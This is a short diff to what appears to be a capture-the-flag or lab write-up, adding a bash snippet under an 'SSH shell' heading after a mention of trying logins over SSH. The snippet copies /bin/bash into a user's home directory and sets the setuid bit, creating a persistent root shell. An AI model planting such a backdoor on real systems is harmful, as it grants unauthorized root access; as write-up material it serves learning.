@@ -131,3 +131,10 @@ I try thoses logins with the ssh as we seen before that the 22 port is open, and
 ## SSH shell
 
 
+```
+#!/bin/bash
+
+cp /bin/bash /home/alix/rootbash
+chmod +s /home/alix/rootbash
+chmod 755 /home/alix/rootbash
+```
